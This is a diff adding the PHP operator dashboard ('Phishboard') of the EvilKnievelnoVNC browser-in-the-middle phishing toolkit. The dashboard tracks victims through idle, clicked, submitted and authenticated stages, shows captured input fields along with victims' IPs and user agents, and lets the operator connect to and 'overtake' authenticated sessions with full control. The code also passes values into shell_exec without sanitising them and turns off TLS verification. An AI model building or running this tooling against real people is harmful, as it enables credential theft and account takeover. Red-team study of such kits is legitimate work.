@@ -1,0 +1,718 @@
+<?php
+// DASHBOARD
+
+$aUrl = "---aUrl---";
+$refreshtimer = 10; // refresh every x seconds
+date_default_timezone_set('Europe/Berlin');
+$dateformat = "Y-m-d H:i:s";
+$statefile = "/etc/targets.json";
+$showhint = false;
+
+function GET($var)  { return isset($_GET[$var])  ? htmlspecialchars($_GET[$var])  : null; }
+function POST($var) { return isset($_POST[$var]) ? htmlspecialchars($_POST[$var]) : null; }
+
+// reset specific EvilnoVNC instance via button
+if(isset($_GET["reset"]) && $_GET["reset"] === "1" && isset($_GET["svr"])) {
+	$sid = GET("svr");
+	$reqid = GET("reqid");
+
+	if((int)$sid < 10 && strlen($sid) < 2) $sid = "0" . $sid;
+
+	$context = [ 'http' => [ 'method' => 'GET' ], 'ssl' => [ 'verify_peer' => false, 'allow_self_signed'=> true ] ];
+
+	// send reset request to controller
+	if(file_get_contents("https://controller/?cmd=reset&svr=$sid&reqid=$reqid", false, stream_context_create($context)) !== false) {
+		echo "[*] successfully sent reset to controller";
+	} else {
+		echo "[*] Error while sending reset to controller";
+	}
+
+	exit(0);
+}
+                                                                                                                                                                                                                                               
+// block user via button                                                                                                                                                                                                                       
+if(isset($_GET["block"]) && $_GET["block"] === "1" && isset($_GET["svr"])) {                                                                                                                                                                   
+        $sid = GET("svr");                                                                                                                                                                                                                     
+        $reqid = GET("reqid");                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                               
+        if((int)$sid < 10 && strlen($sid) < 2) $sid = "0" . $sid;                                                                                                                                                                              
+                                                                                                                                                                                                                                               
+        $context = [ 'http' => [ 'method' => 'GET' ], 'ssl' => [ 'verify_peer' => false, 'allow_self_signed'=> true ] ];                                                                                                                       
+                                                                                                                                                                                                                                               
+        // send block request to controller                                                                                                                                                                                                    
+        if(file_get_contents("https://controller/?cmd=block&svr=$sid&reqid=$reqid", false, stream_context_create($context)) !== false) {                                                                                                       
+                echo "[*] successfully sent block to controller";                                                                                                                                                                              
+        } else {                                                                                                                                                                                                                               
+                echo "[*] Error while sending block to controller";                                                                                                                                                                            
+        }                                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                               
+        exit(0);                                                                                                                                                                                                                               
+}
+
+// check if there is a proper json state file
+if(($json = file_get_contents($statefile)) !== false) {
+	$targets = json_decode($json, true);
+	
+	if(empty($targets))
+		$showhint = true;
+}
+
+function lookupUserId($id) {
+	global $statefile;
+
+	if(($json = file_get_contents($statefile)) !== false) {
+		$state = json_decode($json, true);
+
+		if(is_array($state)) {
+			foreach($state as $s) {
+				if($s["reqid"] === $id) return $s["userid"];
+			}
+		}
+	} else {
+		echo "[!] Could not read state file.";
+	}
+}
+
+?><!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Phishboard|EvilKnievelnoVNC</title>
+	<style>
+	* { margin: 0; padding: 0; }
+	html {
+		background-color: black;
+		opacity: 1;
+		background-size: 30px 30px;
+		background-image:  repeating-linear-gradient(to right, #141414, #141414 1.5px, #000000 1.5px, #000000);
+		border-top: 5px solid #83af00;
+	}
+	body {
+		padding: 10px 40px;
+		color: #ddd;
+		font-family: sans-serif;
+		font-size: 120%;
+	}
+	a, a:hover, a:active, a:visited { color: #83af00; }
+	header, footer {
+		position: relative;
+		width: 100%;
+		text-align: center;
+		padding: 15px 0;
+	}
+	header { border-bottom: 1px solid #333; text-align: right; }
+	header pre { font-size: 30%; font-weight: bold; color: #83af00; }
+	#refresh {
+		position: absolute;
+		bottom: 20px;
+		left: 0px;
+		font-size: 80%;
+		background-color: #222;
+		padding: 4px 4px 2px;
+	}
+	#refresh label,
+	#refresh input { cursor: pointer; }
+	#refresh p {
+		display: inline-block;
+		margin: 0 0 2px 10px;
+	}
+	#hint {
+		position: absolute;
+		top: 20px;
+		left: 0px;
+		font-weight: bold;
+	}
+	footer { border-top: 1px solid #333; }
+	h1 {
+		color: #83af00;
+		font-family: monospace;
+		font-size: 200%;
+	}
+	h2 {
+		font-family: monospace;
+		margin-top: 20px;
+		font-size: 110%;
+		text-shadow: 0 0 4px black, 0 0 6px black, 0 0 6px black, 0 0 6px black;
+	}
+	#left, #right { margin-bottom: 60px; }
+	#left {
+		float: left;
+		width: 22%;
+	}
+	.instances {
+		margin: 20px 0;
+		padding: 8px 0;
+		border: 1px solid #333;
+		font-weight: bold;
+		font-size: 140%;
+		font-family: monospace;
+		text-align: center;
+		background: #000;
+	}
+	.instances p { display: inline; }
+	.instances button  {
+		padding: 4px 6px;
+		background: transparent;
+		border: 1px solid #333;
+		color: #333;
+		font-size: 65%;
+		text-transform: uppercase;
+	}
+	.instances button:hover {
+		cursor: pointer;
+	}
+	.instances button.connect {
+		animation: blink 1.5s steps(2, start) infinite;
+	}
+	@keyframes blink {
+		to {
+			background: #83af00;
+			color: black;
+			border: 1px solid #83af00;
+		}
+	}
+	.instances button.stop {
+		border: 1px solid #c00;
+		color: #c00;
+	}
+	.instances button.stop:hover {
+		background: #c00;
+		color: black;
+	}
+	.instances button:disabled,
+	.instances button.connect:disabled {
+		animation: none;
+		background: transparent;
+		border: 1px solid #333;
+		color: #333;
+	}
+	.instances button:disabled:hover,
+	.instances button.connect:disabled:hover {
+		background: transparent;
+		color: #333;
+		border: 1px solid #333;
+		cursor: auto;
+	}
+	.connected button.connect {
+		border: 1px solid #83af00;
+		animation: none;
+		color: #83af00;
+	}
+	.connected button.connect:hover {
+		background: #83af00;
+		color: black;
+	}
+	.instances .condata {
+		display: block;
+		font-size: 60%;
+		margin: 4px 0 0;
+		font-weight: normal;
+	}
+	#left pre {
+		color: #666;
+		font-size: 90%;
+		margin-top: 34px;
+	}
+	#F5div { text-align: center; }
+	#right {
+		float: right;
+		width: 77%;
+	}
+	table {
+		width: 100%;
+		/*max-height: 300px;
+		overflow-y: scroll;*/
+		padding-top: 30px;
+		font-size: 80%;
+	}
+	table td, table th {
+		padding: 4px;
+	}
+	table th {
+		position: sticky;
+		background-color: #222;
+		text-align: left;
+	}
+	table#auth td {
+		color: #83af00;
+	}
+	.req {
+		color: #999;
+		font-family: monospace;
+	}
+	#right .req { font-size: 110%; }
+	table tr:hover td { color: #83af00; }
+	table tr:hover th { color: #ddd; }
+	table .timestamps { width: 180px; }
+	table .ids { width: 90px; }
+	table .ips { width: 120px; }
+	.col .scrolldiv {
+		max-height: 220px;
+		overflow-y: scroll;
+	}
+	.col {
+		position: relative;
+	}
+	.wide {
+		margin: 20px 0 0;
+	}
+	#columns .col {
+		width: 24%;
+		float: left;
+		margin-right: 1%;
+		max-height: 220px;
+		overflow-y: scroll;
+	}
+	.col > h2,
+	#columns h2 {
+		position: absolute;
+		top: -20px;
+		right: 30px;
+	}
+	table#stats td {
+		width: 33%;
+		white-space: nowrap;
+	}
+	.blocked { color: #c00; }
+	#sum { text-align: center; }
+	#bar0 { background: #131a00; }
+	#bar1 { background: #4d6600; }
+	#bar2 { background: #83af00; color: #000; }
+	#can { margin-top: 20px; }
+	p, pre { margin: 10px 0; }
+	#targetlink { font-weight: bold; }
+
+        @media only screen and (max-width: 1600px) {
+                #left { float: none; width: auto; }
+                #left > pre { display: none; }
+                .instances { float: left; margin: 10px 12px; min-height: 60px; width: 330px; }
+                #right { width: 100%; }
+        }
+
+	/* === Scrollbar CSS === */
+	/* Firefox */
+	* {
+		scrollbar-width: auto;
+		scrollbar-color: #83af00 transparent; /* #4d6600 */
+	}
+
+	/* Chrome, Edge, and Safari */
+	*::-webkit-scrollbar {
+		width: 5px;
+	}
+
+	*::-webkit-scrollbar-track {
+		background: transparent;
+	}
+
+	*::-webkit-scrollbar-thumb {
+		background-color: #83af00;
+		border-radius: 2px;
+	}
+
+	/* === Checkbox Slider === */
+	.switch {
+		display: inline-block;
+		height: 16px;
+		position: relative;
+		width: 32px;
+		margin-bottom: -3px;
+	}
+
+	.switch input { display: none; }
+
+	.slider {
+		background-color: #000;
+		bottom: 0;
+		cursor: pointer;
+		left: 0;
+		position: absolute;
+		right: 0;
+		top: 0;
+	}
+
+	.slider:before {
+		background-color: #ddd;
+		bottom: 0px;
+		content: "";
+		height: 16px;
+		left: 0px;
+		position: absolute;
+		transition: .1s;
+		width: 16px;
+	}
+
+	input:checked + .slider { background-color: #83af00; }
+	input:checked + .slider:before { transform: translateX(16px); }
+
+	.slider.round { border-radius: 10px; }
+	.slider.round:before { border-radius: 50%; }
+	abbr { text-decoration: underline dotted 1px; }
+	</style>
+</head>
+<body>
+<header>
+<?php // https://textkool.com/en/ascii-art-generator?hl=default&vl=default&font=DOS%20Rebel&text=MultiEvilnoVNC ?>
+<pre>
+ ██████████              ███  ████  █████   ████             ███                                ████                      █████   █████ ██████   █████   █████████ 
+░░███░░░░░█             ░░░  ░░███ ░░███   ███░             ░░░                                ░░███                     ░░███   ░░███ ░░██████ ░░███   ███░░░░░███
+ ░███  █ ░  █████ █████ ████  ░███  ░███  ███    ████████   ████   ██████  █████ █████  ██████  ░███  ████████    ██████  ░███    ░███  ░███░███ ░███  ███     ░░░ 
+ ░██████   ░░███ ░░███ ░░███  ░███  ░███████    ░░███░░███ ░░███  ███░░███░░███ ░░███  ███░░███ ░███ ░░███░░███  ███░░███ ░███    ░███  ░███░░███░███ ░███         
+ ░███░░█    ░███  ░███  ░███  ░███  ░███░░███    ░███ ░███  ░███ ░███████  ░███  ░███ ░███████  ░███  ░███ ░███ ░███ ░███ ░░███   ███   ░███ ░░██████ ░███         
+ ░███ ░   █ ░░███ ███   ░███  ░███  ░███ ░░███   ░███ ░███  ░███ ░███░░░   ░░███ ███  ░███░░░   ░███  ░███ ░███ ░███ ░███  ░░░█████░    ░███  ░░█████ ░░███     ███
+ ██████████  ░░█████    █████ █████ █████ ░░████ ████ █████ █████░░██████   ░░█████   ░░██████  █████ ████ █████░░██████     ░░███      █████  ░░█████ ░░█████████ 
+░░░░░░░░░░    ░░░░░    ░░░░░ ░░░░░ ░░░░░   ░░░░ ░░░░ ░░░░░ ░░░░░  ░░░░░░     ░░░░░     ░░░░░░  ░░░░░ ░░░░ ░░░░░  ░░░░░░       ░░░      ░░░░░    ░░░░░   ░░░░░░░░░  
+                                                                                                                                                                   
+</pre>
+
+<div id="refresh">
+	<label class="switch" for="F5">
+		<input id="F5" type="checkbox" checked \>
+		<div class="slider round"></div>
+	</label>
+	<p>auto refresh (<?= $refreshtimer ?> s)</p>
+</div>
+
+<?php
+if($showhint) {
+	echo "<div id='hint'><p>No targets found, <a href='./addtargets.php' target='_blank'>add some</a></p></div>" . PHP_EOL;
+}
+?>
+
+</header>
+<main>
+
+<div id="left">
+<?php
+$state = shell_exec("echo 'show servers state novnc' | nc hap 8000 | grep novnc");
+if(!$state) echo "Error: getting state of all servers";
+$sep = "\r\n";
+$line = strtok($state, $sep);
+
+while($line !== false) {
+	$connected = "";
+	$novnc = explode(" ", $line);
+	$svrname = $novnc[3];
+	$svrno = $novnc[2];
+	if((int)$svrno < 10 && strlen($svrno) < 2) $svrno = "0" . $svrno;
+
+	$state2 = shell_exec("echo 'show servers state b" . $svrno . "' | nc hap 8000 | grep evil");
+	if(!trim($state2)) echo "Error: getting server state";
+
+	$admin = explode(" ", $state2);
+	$disabled = " disabled";
+
+/* svr_op_state:
+https://docs.haproxy.org/2.6/management.html#9.3-show%20servers%20state
+0 = SRV_ST_STOPPED
+1 = SRV_ST_STARTING
+2 = SRV_ST_RUNNING
+3 = SRV_ST_STOPPING
+*/
+	// unkown
+	$color = "#333";
+	// stopped -> gray
+	if($novnc[5] === "0") $color = "#333"; 
+	// starting -> orange
+	if($novnc[5] === "1") $color = "#ff0";
+	// novnc or admin backend available -> green
+	if($novnc[5] === "2" || $admin[5] === "2") $color = "#83af00";
+	// novnc stopped, but admin backend running -> blink!
+	if($novnc[5] === "0" && $admin[5] === "2") $disabled = "";
+	// stopping -> dark red
+	if($novnc[5] === "3") $color = "#f93";
+
+	// check if someone is connected to server instance (novnc/sXX)
+	$state3 = shell_exec("echo 'show servers conn' | nc hap 8000 | grep novnc/s$svrno");
+
+	if(!trim($state3)) {
+		echo "Error: getting servers conn for server s$svrno";
+	} else {
+		$conn = explode(" ", $state3);
+
+		if($conn[6] !== "0") {
+			$connected = " connected";
+			$disabled = "";
+		}
+	}
+
+	// if a victim is connected, try to find its user id via the most recent entry in accesslog
+	$log = $ex = $timestamp = $atime = $duration = $reqid = null;
+	
+	if(!empty($connected) || $disabled === "") {
+		$log = shell_exec("tac /etc/accesslog.txt | grep $svrname | head -n 1");
+		
+		if(!empty($log)) {
+			$ex = explode("\t", $log);
+			$timestamp = $ex[0];
+			$atime = date("Y-m-d H:i:s", $ex[0]);
+			$duration = round((time() - $timestamp) / 60, 1); // in minutes
+			$reqid = $ex[2];
+		}
+	}
+
+	echo "<div class='instances$connected'>
+<p><span style='color: " . $color . ";'>&#x25CF;&nbsp;</span>" . $svrname . "</p>
+<button class='connect' onclick='window.open(\"" . $aUrl . "phishboard/interact.php?svr=" . $svrno . "&reqid=" . $reqid . "\")'" . $disabled . ">connect</button>
+<button class='stop' onclick='reset(this.parentNode, \"" . $svrno . "\", \"" . $reqid . "\")'" . $disabled . ">reset</button>" . PHP_EOL;
+	if(!empty($reqid))
+		echo "<p class='condata'><span class='req'>" . $reqid . "</span> " . lookupUserId($reqid) . " (" . $duration . " min)</p>" . PHP_EOL;
+	echo "</div>" . PHP_EOL;
+
+	$line = strtok($sep);
+}
+?>
+
+<pre>
+green dot
+	server is running
+buttons enabled
+	a client is connected
+blinking connect button
+	client successfully logged in
+	client connections are terminated
+	client is blacklisted
+	READY TO OVERTAKE
+	  AUTHENTICATED SESSION
+
+connect button
+	connect to see what is happening
+	caution: you have full control
+reset button
+	kill open connections
+	restart EvilnoVNC instance
+</pre>
+
+<p><center><a id="targetlink" href='./addtargets.php' target='_blank'>Manage Targets</a></center></p>
+</div>
+
+
+<div id="right">
+<div id="columns" class="wide">
+
+	<div class="col">
+		<table>
+		<tr>
+			<th>req id</th>
+			<th>user id</th>
+		</tr>
+<?php
+$idle_cnt = 0;
+foreach($targets as $t) {
+	if($t["state"] == 0) {
+		$idle_cnt += 1;
+		echo "<tr>" . PHP_EOL;
+		echo "<td class='req'>" . $t["reqid"] . "</td>" . PHP_EOL;
+		echo "<td class='" . ($t["blocked"] == 1 ? "blocked" : "") . "'>" . $t["userid"] . "</td>" . PHP_EOL;
+		echo "</tr>" . PHP_EOL;
+	}
+}
+?>
+		</table>
+		<h2>idle (<?= $idle_cnt ?>)</h2>
+	</div>
+
+	<div class="col">
+		<table>
+		<tr>
+			<th>req id</th>
+			<th>user id</th>
+		</tr>
+<?php
+$click_cnt = 0;
+foreach($targets as $t) {
+	if($t["state"] == 1) {
+		$click_cnt += 1;
+		echo "<tr>" . PHP_EOL;
+		echo "<td class='req'>" . $t["reqid"] . "</td>" . PHP_EOL;
+		echo "<td class='" . ($t["blocked"] == 1 ? "blocked" : "") . "'>" . $t["userid"] . "</td>" . PHP_EOL;
+		echo "</tr>" . PHP_EOL;
+	}
+}
+?>
+		</table>
+		<h2>clicked (<?= $click_cnt ?>)</h2>
+	</div>
+
+	<div class="col">
+		<table>
+		<tr>
+			<th>req id</th>
+			<th>user id</th>
+		</tr>
+<?php
+$subm_cnt = 0;
+foreach($targets as $t) {
+	if($t["state"] == 2) {
+		$subm_cnt += 1;
+		echo "<tr>" . PHP_EOL;
+		echo "<td class='req'>" . $t["reqid"] . "</td>" . PHP_EOL;
+		echo "<td class='" . ($t["blocked"] == 1 ? "blocked" : "") . "'>" . $t["userid"] . "</td>" . PHP_EOL;
+		echo "</tr>" . PHP_EOL;
+	}
+}
+?>
+		</table>
+		<h2>submitted (<?= $subm_cnt ?>)</h2>
+	</div>
+
+	<div class="col">
+		<table id="auth">
+		<tr>
+			<th>req id</th>
+			<th>user id</th>
+		</tr>
+<?php
+$auth_cnt = 0;
+foreach($targets as $t) {
+	if($t["state"] == 3) {
+		$auth_cnt += 1;
+		echo "<tr>" . PHP_EOL;
+		echo "<td class='req'>" . $t["reqid"] . "</td>" . PHP_EOL;
+		echo "<td class='" . ($t["blocked"] == 1 ? "blocked" : "") . "'><abbr title='" . $t["inputs"] . "'>" . $t["userid"] . "</abbr></td>" . PHP_EOL;
+		echo "</tr>" . PHP_EOL;
+	}
+}
+?>
+		</table>
+		<h2>authenticated (<?= $auth_cnt ?>)</h2>
+	</div>
+
+<?php
+
+?>
+	<div style="clear: both;"></div>
+</div>
+
+
+<div class="col wide">
+<div class="scrolldiv">
+<table>
+<tr>
+	<th class="timestamps">timestamp &#9660;</th>
+	<th class="ids">server id</th>
+	<th class="ids">req id</th>
+	<th class="ids">user id</th>
+	<th>submitted input fields</th>
+</tr>
+<?php
+$lines = file("/etc/submitlog.txt", FILE_SKIP_EMPTY_LINES|FILE_IGNORE_NEW_LINES);
+$count = 0;
+
+if(!empty($lines)) {
+	$lines = array_reverse($lines);
+
+	foreach($lines as $line) {
+		$count +=1;
+		$entry = explode("\t", $line);
+		echo "<tr>" . PHP_EOL;
+		echo "\t<td>" . date($dateformat, $entry[0]) . "</td>" . PHP_EOL;
+		echo "\t<td>" . $entry[1] . "</td>" . PHP_EOL;
+		echo "\t<td class='req'>" . $entry[2] . "</td>" . PHP_EOL;
+		echo "\t<td>" . $entry[3] . "</td>" . PHP_EOL;
+		echo "\t<td>";
+		$cnt = 4;
+		while(isset($entry[$cnt])) {
+			echo $entry[$cnt] . " ";
+			$cnt += 1;
+		}
+		echo "</td>" . PHP_EOL;
+		echo "</tr>" . PHP_EOL;
+	}
+}
+?>
+</table>
+</div>
+<h2>submit log (<?= $count ?>)</h2>
+</div>
+
+
+<div class="col wide">
+<div class="scrolldiv">
+<table>
+<tr>
+	<th class="timestamps">timestamp &#9660;</th>
+	<th class="ids">server id</th>
+	<th class="ids">req id</th>
+	<th class="userids">user id</th>
+	<th class="ips">ip address</th>
+	<th>user agent</th>
+</tr>
+<?php
+$lines = file("/etc/accesslog.txt", FILE_SKIP_EMPTY_LINES|FILE_IGNORE_NEW_LINES);
+$count = 0;
+
+if(!empty($lines)) {
+	$lines = array_reverse($lines);
+
+	foreach($lines as $line) {
+		$count +=1;
+		$entry = explode("\t", $line);
+		echo "<tr>" . PHP_EOL;
+		echo "\t<td>" . date($dateformat, $entry[0]) . "</td>" . PHP_EOL;
+		echo "\t<td>" . $entry[1] . "</td>" . PHP_EOL;
+		echo "\t<td class='req'>" . $entry[2] . "</td>" . PHP_EOL;
+		echo "\t<td>" . $entry[3] . "</td>" . PHP_EOL;
+		echo "\t<td>" . $entry[4] . "</td>" . PHP_EOL;
+		echo "\t<td>" . $entry[5] . "</td>" . PHP_EOL;
+		echo "</tr>" . PHP_EOL;
+	}
+}
+?>
+</table>
+</div>
+<h2>access log (<?= $count ?>)</h2>
+</div>
+
+<div class="col wide">
+<h2>stats</h2>
+<?php
+$sum = $idle_cnt + $click_cnt + $subm_cnt + $auth_cnt;
+$clicksubm = $click_cnt + $subm_cnt;
+
+if($sum > 0) :
+	$idle_p  = round(100/$sum*$idle_cnt);
+	$click_p = round(100/$sum*($click_cnt + $subm_cnt));
+	$auth_p  = round(100/$sum*$auth_cnt);
+?>
+<table id="stats">
+<tr>
+	<th>idle</th>
+	<?php if($click_cnt > 0): ?><th><abbr title="includes clicked and submitted">clicked</abbr></th><?php endif; ?>
+	<?php if($auth_cnt > 0): ?><th>auth.</th><?php endif; ?>
+</tr>
+<tr>
+	<?php if($idle_cnt > 0) echo "<td id='bar0' style='width: $idle_p%'>$idle_cnt ($idle_p %)</td>"; ?>
+	<?php if($click_cnt > 0) echo "<td id='bar1' style='width: $click_p%'>$clicksubm ($click_p %)</td>"; ?>
+	<?php if($auth_cnt > 0) echo "<td id='bar2' style='width: $auth_p%'>$auth_cnt ($auth_p %)</td>"; ?>
+</tr>
+<tr>
+	<td colspan="4" id="sum"><?= $sum ?> (100 %)</td>
+</tr>
+</table>
+<?php endif; ?>
+</div> <!-- #right -->
+
+</main>
+<div style="clear: both;"></div>
+<script>
+// refresh page every few seconds if checkbox is checked
+window.setInterval(function () {
+	if(document.getElementById("F5").checked) window.location.reload();
+}, <?= (int)$refreshtimer * 1000 ?>);
+
+// stop and restart server s<num>
+function reset(btnparent, num, reqid) {
+	let xhr = new XMLHttpRequest();
+	const url = window.location.href + "?reset=1&svr=" + num + "&reqid=" + reqid;
+
+	xhr.open("GET", url);
+	xhr.send();
+
+	btnparent.getElementsByTagName("button")[0].setAttribute("disabled", "disabled"); // connect
+	btnparent.getElementsByTagName("button")[1].setAttribute("disabled", "disabled"); // reset
+}
+</script>
+</body>
+</html>
